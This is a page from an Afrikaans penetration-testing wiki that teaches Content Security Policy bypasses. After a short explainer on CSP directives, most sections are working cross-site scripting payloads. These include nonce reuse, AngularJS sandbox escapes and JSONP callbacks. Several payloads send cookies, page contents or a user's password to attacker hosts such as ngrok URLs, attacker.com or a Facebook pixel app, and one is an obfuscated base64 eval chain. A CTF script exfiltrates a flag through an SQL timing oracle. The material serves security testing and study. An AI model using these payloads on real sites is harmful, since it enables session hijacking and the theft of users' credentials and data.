# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## Wat is CSP

Content Security Policy (CSP) word erken as 'n blaaier-tegnologie, hoofsaaklik bedoel om **te beskerm teen aanvalle soos cross-site scripting (XSS)**. Dit funksioneer deur te definieer watter paaie en bronne die blaaier veilig kan laai. Hierdie bronne sluit elemente soos beelde, frames en JavaScript in. Byvoorbeeld kan 'n beleid die laai en uitvoering van bronne vanaf dieselfde domein (`self`) toelaat, insluitend inline-bronne en die uitvoering van string-kode deur funksies soos `eval`, `setTimeout`, of `setInterval`.

Die implementering van CSP word gedoen deur middel van **response headers** of deur **meta-elemente in die HTML-bladsy** in te sluit. Volgens hierdie beleid dwing blaaiers hierdie bepalings af en blokkeer onmiddellik enige opgespoorde oortredings.

- Geïmplementeer via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Geïmplementeer via meta-tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Kopstukke

CSP kan afgedwing of gemonitor word met behulp van hierdie kopstukke:

- `Content-Security-Policy`: Dwing die CSP af; die blaaier blokkeer enige oortredings.
- `Content-Security-Policy-Report-Only`: Word gebruik vir monitering; rapporteer oortredings sonder om dit te blokkeer. Ideaal vir toetsing in voorproduksie-omgewings.

### Definieer hulpbronne

CSP beperk die oorspronge wat beide aktiewe en passiewe inhoud laai, en beheer aspekte soos inline JavaScript-uitvoering en die gebruik van `eval()`. 'n Voorbeeldbeleid is:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktiewe

- **script-src**: Laat spesifieke bronne vir JavaScript toe, insluitend URL's, inline scripts, en scripts wat deur event handlers of XSLT-stylesheets geaktiveer word.
- **default-src**: Stel 'n standaardbeleid vir die haal van hulpbronne in wanneer spesifieke fetch-direktiewe afwesig is.
- **child-src**: Spesifiseer toegelate hulpbronne vir web workers en ingebedde frame-inhoud.
- **connect-src**: Beperk URL's wat gelaai kan word deur interfeise soos fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Beperk URL's vir frames.
- **frame-ancestors**: Spesifiseer watter bronne die huidige bladsy kan inkorporeer, toepaslik op elemente soos `<frame>`, `<iframe>`, `<object>`, `<embed>`, en `<applet>`.
- **img-src**: Definieer toegelate bronne vir beelde.
- **font-src**: Spesifiseer geldige bronne vir fonts wat met `@font-face` gelaai word.
- **manifest-src**: Definieer toegelate bronne van applikasie-manifestlêers.
- **media-src**: Definieer toegelate bronne vir die laai van media-objekte.
- **object-src**: Definieer toegelate bronne vir `<object>`, `<embed>`, en `<applet>`-elemente.
- **base-uri**: Spesifiseer toegelate URL's vir laai met `<base>`-elemente.
- **form-action**: Lys geldige endpunte vir vormsindienings.
- **plugin-types**: Beperk mime-tipes wat 'n bladsy mag aanroep.
- **upgrade-insecure-requests**: Beveel browsers om HTTP-URL's na HTTPS te herskryf.
- **sandbox**: Pas beperkings toe soortgelyk aan die sandbox-atribuut van 'n `<iframe>`.
- **report-to**: Spesifiseer 'n groep waarheen 'n verslag gestuur sal word indien die beleid oortree word.
- **worker-src**: Spesifiseer geldige bronne vir Worker-, SharedWorker- of ServiceWorker-skripte.
- **prefetch-src**: Spesifiseer geldige bronne vir hulpbronne wat gehaal of vooraf gelaai sal word.
- **navigate-to**: Beperk die URL's waarna 'n dokument op enige wyse kan navigeer (a, form, window.location, window.open, ens.)

### Bronne

- `*`: Laat alle URL's toe behalwe dié met `data:`, `blob:`, `filesystem:` skemas.
- `'self'`: Laat laai toe vanaf dieselfde domein.
- `'data'`: Laat hulpbronne toe om via die data-skema gelaai te word (bv. Base64-gekodeerde beelde).
- `'none'`: Blokkeer laai vanaf enige bron.
- `'unsafe-eval'`: Laat die gebruik van `eval()` en soortgelyke metodes toe; nie aanbeveel vir sekuriteitsredes nie.
- `'unsafe-hashes'`: Skakel spesifieke inline event handlers in.
- `'unsafe-inline'`: Laat die gebruik van inline hulpbronne toe, soos inline `<script>` of `<style>`; nie aanbeveel vir sekuriteitsredes nie.
- `'nonce'`: 'n witlys vir spesifieke inline scripts wat 'n kriptografiese nonce gebruik (nommer een keer gebruik).

- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Laai script deur nonce te hergebruik</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Voeg skripte met 'n spesifieke sha256-hash by die witlys.
- `'strict-dynamic'`: Maak dit moontlik om skripte van enige bron te laai as dit deur 'n nonce of hash op die witlys geplaas is.
- `'host'`: Spesifiseer 'n spesifieke gasheer, soos `example.com`.
- `https:`: Beperk URL's tot dié wat HTTPS gebruik.
- `blob:`: Laat hulpbronne vanaf Blob-URL's laai (bv. Blob-URL's geskep via JavaScript).
- `filesystem:`: Laat hulpbronne vanaf die lêerstelsel laai.
- `'report-sample'`: Sluit 'n voorbeeld van die oortredende kode in die oortredingsverslag in (nuttig vir foutopsporing).
- `'strict-origin'`: Gelyk aan 'self', maar verseker dat die protokol-sekuriteitsvlak van die bronne by die dokument pas (slegs veilige oorspronge kan hulpbronne vanaf veilige oorspronge laai).
- `'strict-origin-when-cross-origin'`: Stuur volledige URL's wanneer dieselfde-oorsprong versoeke gemaak word, maar stuur slegs die oorsprong wanneer die versoek kruis-oorsprong is.
- `'unsafe-allow-redirects'`: Laat hulpbronne laai wat dadelik na 'n ander hulpbron sal herlei. Nie aanbeveel nie, aangesien dit sekuriteit verswak.

## Onveilige CSP-reëls

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Werkende payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Dit werk nie, vir meer inligting [**kyk hier**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Werkende payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

As jy op een of ander manier 'n **allowed JS code created a new script tag** in die DOM met jou JS code kan laat skep, omdat 'n allowed script dit skep, sal die **new script tag will be allowed to be executed**.

### Wildkaart (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Werkende payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Gebrek aan object-src en default-src

> [!CAUTION] > **Dit lyk asof dit nie meer werk nie**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Werkende payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Lêeroplaai + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
As jy 'n JS-lêer kan oplaai, kan jy hierdie CSP bypass:

Working payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Dit is egter hoogs waarskynlik dat die server die opgelaaide lêer **valideer** en slegs sal toelaat dat jy **'n bepaalde tipe lêers oplaai**.

Verder, selfs as jy 'n **JS code inside** in 'n lêer kon oplaai met 'n uitbreiding wat deur die server aanvaar word (soos: _script.png_) sal dit nie genoeg wees nie, omdat sommige bedieners soos apache server **select MIME type of the file based on the extension** en blaaiers soos Chrome sal **reject to execute Javascript** code binne iets wat 'n beeld behoort te wees. "Hopelik", is daar foute. Byvoorbeeld, in 'n CTF het ek geleer dat **Apache doesn't know** die _**.wave**_ uitbreiding; daarom stuur dit nie 'n **MIME type like audio/\*** saam nie.

Van hier af, as jy 'n XSS en 'n lêeroplaai vind, en jy daarin slaag om 'n **misinterpreted extension** te vind, kan jy probeer om 'n lêer met daardie uitbreiding en die inhoud van die script op te laai. Of, as die server die korrekte formaat van die opgelaaide lêer kontroleer, skep 'n polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

As dit nie moontlik is om JS in te spuit nie, kan jy steeds probeer om byvoorbeeld credentials te exfiltreer deur 'n **injecting a form action** (en dalk verwag dat password managers wagwoorde outomaties invul). Jy kan 'n [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp) vind. Let ook daarop dat `default-src` form actions nie dek nie.

> [!WARNING]
> Vir sommige van die volgende payloads is **`unsafe-eval` nie eens nodig nie**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Laai 'n kwesbare weergawe van angular en voer arbitrêre JS uit:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads wat Angular gebruik + 'n library met functions wat die `window` object teruggee ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Die post wys dat jy alle **libraries** van `cdn.cloudflare.com` (of enige ander toegelate JS libraries repo) kan **load**, alle bygevoegde **functions** van elke library kan uitvoer, en kan nagaan **watter functions van watter libraries die `window` object teruggee**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS vanaf 'class name':
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Misbruik van google recaptcha JS code

Volgens [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) kan jy [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) binne 'n CSP misbruik om ewekansige JS-kode uit te voer en die CSP te omseil:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Meer [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Misbruik van www.google.com vir open redirect

Die volgende URL herlei na example.com (van [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Misbruik van \*.google.com/script.google.com

Dit is moontlik om Google Apps Script te misbruik om inligting op 'n bladsy binne script.google.com te ontvang. Soos dit [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Derdepartye-eindpunte + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenario's soos hierdie, waar `script-src` op `self` gestel is en 'n bepaalde domein whitelisted is, kan deur JSONP omseil word. JSONP endpoints laat onveilige callback-metodes toe wat 'n aanvaller toelaat om XSS uit te voer. Werkende payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **bevat gereed-om-te-gebruik JSONP endpoints om CSP te omseil op verskeie webwerwe.**

Dieselfde kwesbaarheid sal voorkom as die **vertroude endpoint 'n Open Redirect bevat**, omdat as die aanvanklike endpoint vertrou is, word omleidings vertrou.

### Derdeparty-misbruik

Soos beskryf in die [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), is daar baie derdeparty-domeine wat moontlik iewers in die CSP toegelaat word en misbruik kan word om óf data te exfiltrate óf JavaScript-kode uit te voer. Sommige van hierdie derdepartye is:

| Entiteit           | Toegelate domeine                            | Vermoëns    |
| ------------------ | -------------------------------------------- | ----------- |
| Facebook           | www.facebook.com, \*.facebook.com            | Exfil       |
| Hotjar             | \*.hotjar.com, ask.hotjar.io                 | Exfil       |
| Jsdelivr           | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec        |
| Amazon CloudFront  | \*.cloudfront.net                            | Exfil, Exec |
| Amazon AWS         | \*.amazonaws.com                             | Exfil, Exec |
| Azure Websites     | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec |
| Salesforce Heroku  | \*.herokuapp.com                             | Exfil, Exec |
| Google Firebase    | \*.firebaseapp.com                           | Exfil, Exec |

As jy enige van die toegelate domeine in die CSP van jou teiken vind, is daar 'n goeie kans dat jy die CSP kan omseil deur by die derdepartydiens te registreer en óf data te exfiltrate na daardie diens óf kode uit te voer.

Byvoorbeeld, as jy die volgende CSP vind:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
of
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Jy behoort in staat te wees om exfiltrate data, soortgelyk aan hoe dit altyd met [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) gedoen is. In hierdie geval volg jy hierdie algemene stappe:

1. Skep 'n Facebook Developer account hier.
2. Skep 'n nuwe "Facebook Login" app en kies "Website".
3. Gaan na "Settings -> Basic" en kry jou "App ID"
4. Op die target site waarvan jy data wil exfiltrate, kan jy data exfiltrate deur direk die Facebook SDK gadget "fbq" te gebruik via 'n "customEvent" en die data payload.
5. Gaan na jou App "Event Manager" en kies die toepassing wat jy geskep het (let wel: die event manager kan in 'n URL soos hierdie gevind word: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events)
6. Kies die tab "Test Events" om die events te sien wat deur "jou" web site gestuur word.

Dan, aan die victim-kant, voer jy die volgende code uit om die Facebook tracking pixel te initialiseer sodat dit na die attacker's Facebook developer account app-id wys en 'n custom event uitstuur soos volg:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Wat die ander sewe derdeparty-domeine in die vorige tabel betref, is daar baie ander maniere waarop jy hulle kan misbruik. Verwys na die eerdergenoemde [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) vir bykomende verduidelikings oor ander misbruike van derdeparty-domeine.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Benewens die hiervoor genoemde omleiding om padbeperkings te bypass, is daar 'n ander tegniek genaamd Relative Path Overwrite (RPO) wat op sommige bedieners gebruik kan word.

Byvoorbeeld, as CSP die pad `https://example.com/scripts/react/` toelaat, kan dit soos volg bypass word:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Die blaaier sal uiteindelik `https://example.com/scripts/angular/angular.js` laai.

Dit werk omdat die blaaier `..%2fangular%2fangular.js` laai wat onder `https://example.com/scripts/react/` geleë is, wat in ooreenstemming met CSP is.

Sodra dit gedekodeer word, versoek dit effektief `https://example.com/scripts/react/../angular/angular.js`, wat ekwivalent is aan `https://example.com/scripts/angular/angular.js`.

Deur **hierdie inkonsekwentheid in URL-interpretasie tussen die blaaier en die bediener te benut, kan die padreëls omseil word**.

Die oplossing is om `%2f` nie as `/` aan die bedienerkant te behandel nie, en sodoende 'n konsekwente interpretasie tussen die blaaier en die bediener te verseker om hierdie probleem te vermy.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### Ontbrekende **base-uri**

As die **base-uri** directive ontbreek kan jy dit misbruik om 'n [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html) uit te voer.

Verder, as die **page is loading a script using a relative path** (soos `<script src="/js/app.js">`) wat 'n **Nonce** gebruik, kan jy die **base** **tag** misbruik om dit te laat **load** die script vanaf **jou own server achieving a XSS.**\
As die kwesbare bladsy met **httpS** gelaai word, gebruik 'n httpS url in die base.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS gebeurtenisse

'n Spesifieke beleid, bekend as Content Security Policy (CSP), kan JavaScript-gebeure beperk. Desondanks bied AngularJS aangepaste gebeure as 'n alternatief. Binne 'n gebeurtenis voorsien AngularJS die unieke objek `$event`, wat na die native browser event-objek verwys. Hierdie `$event`-objek kan uitgebuit word om die CSP te omseil. Opmerkingswaardig is dat in Chrome die `$event/event`-objek 'n `path`-attribuut het, wat 'n array van objekte bevat wat betrokke is by die uitvoerketting van die gebeurtenis, met die `window`-objek altyd aan die einde. Hierdie struktuur is deurslaggewend vir sandbox escape-taktieke.

Deur hierdie array na die `orderBy`-filter te rig, is dit moontlik om dit te deurloop en die finale element (die `window`-objek) te gebruik om 'n globale funksie soos `alert()` te aktiveer. Die onderstaande voorbeeld-kode verduidelik hierdie proses:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Hierdie snippet beklemtoon die gebruik van die `ng-focus` direktief om die gebeurtenis te aktiveer, gebruik `$event.path|orderBy` om die `path`-reeks te manipuleer, en benut die `window`-objek om die `alert()`-funksie uit te voer, sodoende `document.cookie` te openbaar.

**Vind ander Angular bypasses in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS en whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
’n CSP-beleid wat domeine vir script loading in ’n Angular JS-toepassing op ’n witlys plaas, kan omseil word deur die aanroep van callback functions en sekere kwesbare classes. Verdere inligting oor hierdie tegniek is beskikbaar in ’n gedetailleerde gids op hierdie [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Werkende payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Ander JSONP arbitrary execution endpoints kan gevind word in [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (sommige daarvan is verwyder of reggemaak)

### Bypass via Redirection

Wat gebeur wanneer CSP 'n bedienerkant-omleiding teëkom? As die omleiding na 'n ander origin lei wat nie toegelaat word nie, sal dit steeds misluk.

Volgens die beskrywing in [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), kan 'n omleiding wat na 'n ander pad lei, egter die oorspronklike beperkings omseil.

Hier is 'n voorbeeld:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
As CSP gestel is op `https://www.google.com/a/b/c/d`, aangesien die pad in ag geneem word, sal beide `/test` en `/a/test` skripte deur CSP geblokkeer word.

Die finale `http://localhost:5555/301` sal egter **op die server-side herlei word na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Aangesien dit 'n herleiding is, word die **pad nie in ag geneem nie**, en die **skrip kan gelaai word**, wat dus die padbeperking omseil.

Met hierdie herleiding sal dit, selfs as die pad volledig gespesifiseer is, steeds omseil word.

Daarom is die beste oplossing om te verseker dat die webwerf geen open redirect kwesbaarhede het nie en dat daar geen domeine in die CSP-reëls is wat misbruik kan word nie.

### Bypass CSP with dangling markup

Lees [hier hoe](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` beteken dat jy enige skrip binne die kode kan uitvoer (XSS kan kode uitvoer) en `img-src *` beteken dat jy op die webblad enige beeld van enige bron kan gebruik.

Jy kan hierdie CSP omseil deur die data via beelde te eksfiltreer (in hierdie geval misbruik die XSS 'n CSRF waar 'n bladsy wat deur die bot toeganklik is 'n SQLi bevat, en ekstraheer die flag via 'n beeld):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Van: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Jy kan hierdie konfigurasie ook misbruik om **javascript code wat in 'n beeld ingevoeg is, te laai**. As die blad byvoorbeeld toelaat om beelde vanaf Twitter te laai, kan jy 'n **spesiale beeld** **maak**, dit na Twitter **oplaai** en die "**unsafe-inline**" misbruik om 'n JS-kode (soos 'n gewone XSS) uit te **voer** wat die **beeld** sal **laai**, die **JS** daaruit **uittrek** en dit **uitvoer**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Met Service Workers

Service workers se **`importScripts`** funksie word nie deur CSP beperk nie:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Beleidsinjeksie

**Navorsing:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

As 'n **parameter** wat deur jou gestuur word in die **verklaring** van die **beleid** ingevoeg word, kan jy die **beleid** op 'n manier **verander** wat dit **onbruikbaar** maak. Jy kan **allow script 'unsafe-inline'** kry met enige van hierdie omseilings:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Omdat hierdie directive die bestaande script-src directives sal **oorskryf**.\
Jy kan 'n voorbeeld hier vind: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

In Edge is dit baie eenvoudiger. As jy net dit in die CSP kan voeg: **`;_`** sal **Edge** die hele **beleid** verwerp.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Tydaanval

Let op die gebrek aan die direktief `'unsafe-inline'`\
Hierdie keer kan jy die slagoffer laat **laai** 'n bladsy onder **jou beheer** via **XSS** met 'n `<iframe`. Hierdie keer gaan jy die slagoffer laat toegang kry tot die bladsy waarvan jy inligting wil onttrek (**CSRF**). Jy kan nie toegang tot die inhoud van die bladsy kry nie, maar as jy op een of ander manier die **tyd wat die bladsy nodig het om te laai** kan beheer, kan jy die inligting wat jy nodig het onttrek.

Hierdie keer gaan 'n **flag** onttrek word; elke keer wanneer 'n **char korrek geraai** word via SQLi neem die **antwoord** **meer tyd** as gevolg van die sleep-funksie. Dan sal jy die flag kan onttrek:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Via Bookmarklets

Hierdie aanval behels sosiale ingenieurskap waar die aanvaller die gebruiker **oortuig om 'n skakel oor die bookmarklet van die blaaier te sleep en neer te laat**. Hierdie bookmarklet sal **kwaadaardige javascript** kode bevat wat wanneer drag\&dropped of geklik word in die konteks van die huidige webvenster uitgevoer word, **CSP omseil en toelaat dat sensitiewe inligting** soos cookies of tokens gesteel word.

